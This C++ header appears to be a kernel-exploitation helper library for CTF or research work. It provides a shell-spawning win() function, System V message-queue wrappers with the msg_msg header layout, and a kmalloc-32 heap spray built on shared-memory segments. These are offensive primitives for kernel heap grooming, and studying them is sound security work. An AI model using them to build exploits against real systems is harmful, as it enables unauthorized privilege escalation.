#ifndef __EXP_H__
#define __EXP_H__

// msg_msg
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

// shm_file_data
#include <sys/ipc.h>
#include <sys/shm.h>

namespace pwn
{

    void win()
    {
        char *argv[] = {(char *)"/bin/sh", NULL};
        char *envp[] = {NULL};
        execve("/bin/sh", argv, envp);
    }

    namespace msg_msg
    {
        // msg_msg structs
        typedef struct
        {
            long mtype;
            char mtext[1];
        } msg;

        typedef struct
        {
            void *ll_next;
            void *ll_prev;
            long m_type;
            size_t m_ts;
            void *next;
            void *security;
        } msg_header;

        int32_t make_queue(key_t key, int msgflg)
        {
            int32_t result;
            if ((result = msgget(key, msgflg)) == -1)
            {
                perror("msgget failure");
                exit(-1);
            }
            return result;
        }
        void get_msg(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg)
        {
            if (msgrcv(msqid, msgp, msgsz, msgtyp, msgflg) < 0)
            {
                perror("msgrcv");
                exit(-1);
            }
            return;
        }

        void send_msg(int msqid, void *msgp, size_t msgsz, int msgflg)
        {
            if (msgsnd(msqid, msgp, msgsz, msgflg) == -1)
            {
                perror("msgsend failure");
                exit(-1);
            }
            return;
        }
    }

    namespace kmalloc_32
    {
        namespace shm_file_data
        {
            void spray(size_t num_of_spray)
            {
                // spray shmem structures
                int shmid;
                void *shmaddr;
                for (int i = 0; i < num_of_spray; i++)
                {
                    if ((shmid = shmget(IPC_PRIVATE, 100, 0600)) == -1)
                    {
                        perror("shmget error");
                        exit(-1);
                    }
                    shmaddr = shmat(shmid, NULL, 0);
                    if (shmaddr == (void *)-1)
                    {
                        perror("shmat error");
                        exit(-1);
                    }
                }
            }
        }
    }
}
#endif